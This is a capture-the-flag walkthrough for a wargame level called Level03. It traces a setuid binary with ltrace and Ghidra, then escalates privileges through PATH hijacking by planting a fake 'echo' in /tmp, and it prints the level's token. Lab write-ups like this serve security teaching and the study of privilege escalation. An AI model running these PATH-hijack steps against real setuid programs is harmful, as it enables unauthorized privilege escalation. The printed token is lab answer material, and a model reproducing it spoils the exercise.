# Level03 Documentation

## Objective
Exploit a vulnerable binary to retrieve the token for `level04` by manipulating the `PATH` environment variable.

---

## Approach & Tools
- **Technique**: Path hijacking and environment variable manipulation.
- **Commands**: `ln` or `echo` , `export`, `ltrace`, `su`.
- **Tools**: [ghidra](https://ghidra-sre.org/) (optional).

## Step-by-Step Solution

### 1. Locate the binary file
once we log into level03 account we find a binary named ```level03```.
```bash
ls -la /home/user/level03/
```
#### Output:
```bash
-dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

### 1. Analyze the Binary
The `level03` binary prints "Exploit me" and dont take any do not accept any command line arguments nor any does it takes any input. we can use [ltrace](https://www.man7.org/linux/man-pages/man1/ltrace.1.html). to trace system calls in ```level03``.
```bash
ltrace ./level03
```

#### output
```bash
__libc_start_main(0x80484a4, 1, 0xbffffd14, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                       = 2003
geteuid()                                                       = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

To better visualize this code we can use a decompile that can reconstruct this code to more higher level code, such as C / C++. i used ghidra

The decompiled code from Ghidra is as follows :
```c
int main(int argc,char **argv,char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```
### 2. Exploit the PATH
The binary uses env to find echo, which searches PATH. we can hijack that: 
```bash
# Create a fake 'echo' that runs getflag
echo "getflag" > /tmp/echo
# add execution permission to the fake 'echo'
chmod +x /tmp/echo
# Make our /tmp first in PATH
export PATH=/tmp:$PATH
# Run the binary
./level03
```
or using `ln` symbolic link:
```bash
# Create a fake 'echo' that runs getflag
ln -s /bin/getflag /tmp/echo
# Make our /tmp first in PATH
export PATH=/tmp:$PATH
# Run the binary
./level03
```
#### output
```bash
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
### Key Takeaways

* ltrace is Your Friend: Quickly reveals system functions calls and without complex dicompliaer.
* PATH Exploitation: Control over PATH allows hijacking command execution.
* Symbolic Links: Use ln -s to redirect command execution.
* Least Privilege: Programs should use absolute paths for security-critical binaries.
